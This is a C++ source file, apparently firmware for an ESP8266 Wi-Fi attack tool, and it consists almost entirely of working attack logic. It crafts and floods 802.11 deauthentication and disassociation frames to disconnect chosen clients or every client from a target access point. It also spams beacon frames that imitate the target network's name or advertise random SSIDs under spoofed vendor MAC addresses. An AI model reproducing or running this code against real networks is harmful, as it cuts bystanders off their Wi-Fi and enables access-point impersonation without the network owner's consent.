#include "Attack.h"

Attack::Attack(){
  for(int i=0;i<attackNum;i++){
    stati[i] = "ready";
    running[i] = false;
    previousMillis[i] = 0;
  }
}

void Attack::generate(int num){

  randomSeed(os_random());
  uint8_t randomMac[6] = {0x00,0x01,0x02,0x00,0x00,0x00};

  //generate all beacons
  if(num == -1){
    for(int i=0;i<randomBeacons;i++){
      getRandomVendorMac(randomMac);
      for(int h=0;h<SSIDLen;h++) beaconSSIDs[i][h] = random(32,126); //see: https://www.arduino.cc/en/Reference/ASCIIchart
      for(int h=0;h<6;h++) beaconMACs[i][h] = randomMac[h];
      beaconNumbers[i] = random(100,255);
      //beaconChannels[i] = random(1,12);
      //Serial.println(data_getVendor(randomMac[0],randomMac[1],randomMac[2]));
    }
  }
  //generate specific beacon
  else if(num>=0 && num<=randomBeacons){
      getRandomVendorMac(randomMac);
      for(int h=0;h<SSIDLen;h++) beaconSSIDs[num][h] = random(32,126); //see: https://www.arduino.cc/en/Reference/ASCIIchart
      for(int h=0;h<6;h++) beaconMACs[num][h] = randomMac[h];
      beaconNumbers[num] = random(100,255);
      //beaconChannels[num] = random(1,12);
      //Serial.println(data_getVendor(randomMac[0],randomMac[1],randomMac[2]));
  }

}

bool Attack::send(uint8_t buf[], int len){
  delay(1);
  if(wifi_send_pkt_freedom(buf, len, 0) == -1){
    Serial.print(packetSize);
    Serial.print(" : ");
    PrintHex8(packet, packetSize);
    Serial.println("");
    return false;
  }else return true;
}

void Attack::start(int num){

  if(!running[num]){
    running[num] = true;
    stati[num] = "starting";

    switch(num){
      case 0: //deauth selected
        running[1] = false;
        stati[1] = "ready";
        //set Mac adresses
        for(int i=0;i<6;i++){
          deauthPacket[10+i] = deauthPacket[16+i] = apScan.getTarget()._get(i);
        }
        
        break;
      case 1: //deauth broadcast
      
        running[0] = false;
        stati[0] = "ready";
        for(int i=0;i<6;i++){
          deauthPacket[4+i] = 0xFF;
          deauthPacket[10+i] = deauthPacket[16+i] = apScan.getTarget()._get(i);
        }
        
        break;
      case 2: //beacon
      
        running[3] = false;
        stati[3] = "ready";
        
        break;
      case 3: //random beacon
      
        running[2] = false;
        stati[2] = "ready";
        
        break;
      default:
        break;
    }
  }else{
    running[num] = false;
    stati[num] = "ready";
  }
}

String Attack::getResults(){

  if(apScan.selected < 0) stati[0] = stati[1] = stati[2] = "no AP";
  
  String json = "{ \"aps\": [";
  json += "\""+apScan.getAPName(apScan.selected)+"\"";
  json += "], \"clients\": [";

  int selectedClientsNum = 0;
  
  for(int i=0;i<clientScan.results;i++){
    if(clientScan.getClientSelected(i)){
      json += "\""+clientScan.getClientMac(i).toString()+" "+clientScan.getClientVendor(i)+" - "+clientScan.getClientName(i)+"\",";
      selectedClientsNum++;
    }
  }

  if(selectedClientsNum == 0) stati[0] =  "no client";
  else json.remove(json.length()-1);

  json += "], \"attacks\": [";
  for(int i=0;i<attackNum;i++){
    json += "{";
    json += "\"name\": \""+attackNames[i]+"\",";
    json += "\"status\": \""+stati[i]+"\",";
    json += "\"running\": "+(String)running[i];
    json += "}";
    if(i < attackNum-1) json += ",";
  }
  json += "] }";
  
  return json;
}

void Attack::run(){
  currentMillis = millis();

  if(running[0]){//deauth all
    if((currentMillis - previousMillis[0]) >= 1000/deauthsPerSecond){

      int clientsSelected = 0;
      
      for(int i=0;i<clientScan.results;i++){
        
        if(clientScan.getClientSelected(i)){
          clientsSelected++;
          
          //set Mac adresses
          for(int h=0;h<6;h++){
            deauthPacket[4+h] = clientScan.getClientMac(i)._get(h);
            deauthPacket[10+h] = deauthPacket[16+h] = apScan.getTarget()._get(h);
          }

          //send deauth frame
          deauthPacket[0] = 0xc0;
          if(send(deauthPacket, 26)) packetsCounter[0]++;

          //send disassociate frame
          deauthPacket[0] = 0xa0;
          if(send(deauthPacket, 26)) packetsCounter[0]++;

          previousMillis[0] = millis();

        }
        
      }
      if(clientsSelected == 0) running[0] = false;
    }

    if(currentMillis - previousSecond[0] >= 1000){
      stati[0] = (String)packetsCounter[0]+"pkts/s";
      packetsCounter[0] = 0;
      previousSecond[0] = millis();
      //Serial.println("");
    }

  }
  if(running[1]){//deauth selected
    if((currentMillis - previousMillis[1]) >= 1000/deauthsPerSecond){

      //send deauth
      deauthPacket[0] = 0xc0;
      if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == -1){/*
        Serial.print(packetSize);
        Serial.print(" : ");
        PrintHex8(packet, packetSize);
        Serial.println("");*/
      }else packetsCounter[1]++;

      delay(1);

      //send disassociate
      deauthPacket[0] = 0xa0;
      if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == -1){/*
        Serial.print(packetSize);
        Serial.print(" : ");
        PrintHex8(packet, packetSize);
        Serial.println("");*/
      }else packetsCounter[1]++;

      previousMillis[1] = millis();

    }

    if(currentMillis - previousSecond[1] >= 1000){
      stati[1] = (String)packetsCounter[1]+"pkts/s";
      packetsCounter[1] = 0;
      previousSecond[1] = millis();
      //Serial.println("");
    }

  }

  if(running[2] || running[3]){//beacon spam

    if((currentMillis - previousMillis[3]) >= 1000/beaconPerSecond){
      previousMillis[3] = millis();
      randomBeaconCounter = 0;

      for(int i=0;i<randomBeacons;i++){
        //unsigned long startTime = millis();
        randomBeaconCounter++;
        generateBeaconPacket();

        if(wifi_send_pkt_freedom(packet, packetSize, 0) == -1){/*
          Serial.print(packetSize);
          Serial.print(" : ");
          PrintHex8(packet, packetSize);
          Serial.println("");*/
        }else packetsCounter[3]++;
        delay(1/*((1000/beaconPerSecond)/randomBeacons)-1/*(millis()-startTime)*/);
      }
    }

    if(currentMillis - previousSecond[3] >= 1000){
      if(running[3]) stati[3] = (String)packetsCounter[3]+"pkts/s";
      else stati[2] = (String)packetsCounter[3]+"pkts/s";
      packetsCounter[3] = 0;
      previousSecond[3] = millis();
    }

  }
}

void Attack::generateBeaconPacket(){

      if(currentMillis - previousRandomBeaconMillis >= randomBeaconChange*1000){
        generate(oldRandomBeacon);
        //Serial.println("generated new beacon"+(String)oldRandomBeacon);
        oldRandomBeacon++;
        if(oldRandomBeacon == randomBeacons) oldRandomBeacon = 0;
        previousRandomBeaconMillis = currentMillis;
      }

      packetSize = 0;
      for(int i=0;i<sizeof(beaconPacket_header);i++) packet[i] = beaconPacket_header[i];
      packetSize += sizeof(beaconPacket_header);

      if(running[2]){ //target spam

        String apName = apScan.getAPName(apScan.selected);
        
        //adds spaces to the AP-SSID if the name length is smaller then the max size of 32
        int _restNameLen = SSIDLen - apName.length();

        if(randomBeaconCounter < _restNameLen) for(int i=0;i<_restNameLen-randomBeaconCounter;i++) apName += " ";//e.g. "SAMPLEAP           "
        else if(randomBeaconCounter < _restNameLen*2){
          apName = "."+apName;
          for(int i=0;i<(_restNameLen-1)-randomBeaconCounter/2;i++) apName += " ";//e.g. ".SAMPLEAP   "
        }
        else apName += " "+(String)beaconNumbers[randomBeaconCounter];//e.g. "SAMPLEAP 329"

        int _ssidLen = apName.length();

        //set SSID size
        packet[packetSize] = 0x00;
        packet[packetSize+1] = _ssidLen;
        packetSize += 2;

        //set SSID
        for(int i=0;i<_ssidLen;i++) packet[packetSize+i] = apName[i];
        packetSize += _ssidLen;

        if(apScan.getAPEncryption(apScan.selected) == "WPA2" ||
          apScan.getAPEncryption(apScan.selected) == "WPA" ||
          apScan.getAPEncryption(apScan.selected) == "WPA*"){
          //set RSN tag
          for(int i=0;i<sizeof(beaconWPA2tag);i++) packet[packetSize+i] = beaconWPA2tag[i];
          packetSize += sizeof(beaconWPA2tag);
        }



      }else { //random spam
        //set SSID size
        packet[packetSize] = 0x00;
        packet[packetSize+1] = (uint8_t)SSIDLen;
        packetSize += 2;

        //set SSID
        for(int i=0;i<SSIDLen;i++) packet[packetSize+i] = beaconSSIDs[randomBeaconCounter][i];
        packetSize += SSIDLen;
      }

      for(int i=0;i<sizeof(beaconPacket_end);i++) packet[packetSize+i] = beaconPacket_end[i];
      packetSize += sizeof(beaconPacket_end);

      //set MAC
      for(int i=0;i<6;i++) packet[10+i] = packet[16+i] = beaconMACs[randomBeaconCounter][i];
}

void Attack::stopAll(){
  for(int i=0;i<attackNum;i++){
    running[i] = false;
    stati[i] = "ready";
  }
}
void Attack::stop(int num){
  if(num>=0 && num<attackNum){
    running[num] = false;
    stati[num] = "ready";
  }
}
